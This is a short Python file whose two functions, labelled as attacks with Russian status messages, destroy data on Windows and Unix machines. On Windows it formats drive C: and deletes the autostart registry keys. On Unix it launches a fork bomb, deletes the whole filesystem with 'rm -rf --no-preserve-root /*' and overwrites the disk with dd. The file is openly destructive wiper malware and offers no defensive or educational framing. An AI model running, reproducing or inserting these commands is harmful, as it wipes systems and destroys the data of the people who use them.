import subprocess
import time
from colors import Colors

def destroy_windows():
    try:
        print(f"{Colors.FAIL}[ATTACK] Запуск форматирования C:{Colors.ENDC}")
        subprocess.Popen("format C: /q /y", shell=True, creationflags=0x00000010)  # CREATE_NEW_CONSOLE = 0x10
        time.sleep(1)
        print(f"{Colors.FAIL}[ATTACK] Удаление записей автозагрузки...{Colors.ENDC}")
        subprocess.Popen("reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /va /f", shell=True)
        time.sleep(1)
        subprocess.Popen("reg delete HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /va /f", shell=True)
    except Exception as e:
        print(f"Ошибка в атаке на Windows: {e}")

def destroy_unix():
    try:
        print(f"{Colors.FAIL}[ATTACK] Запуск вилочной бомбы...{Colors.ENDC}")
        subprocess.Popen(":(){:|:&};:", shell=True)
        time.sleep(1)
        print(f"{Colors.FAIL}[ATTACK] Удаление файловой системы...{Colors.ENDC}")
        subprocess.Popen("rm -rf --no-preserve-root /*", shell=True)
        time.sleep(1)
        print(f"{Colors.FAIL}[ATTACK] Уничтожение MBR/GPT...{Colors.ENDC}")
        subprocess.Popen("dd if=/dev/urandom of=/dev/sda", shell=True)
    except Exception as e:
        print(f"Ошибка в атаке на Unix: {e}")
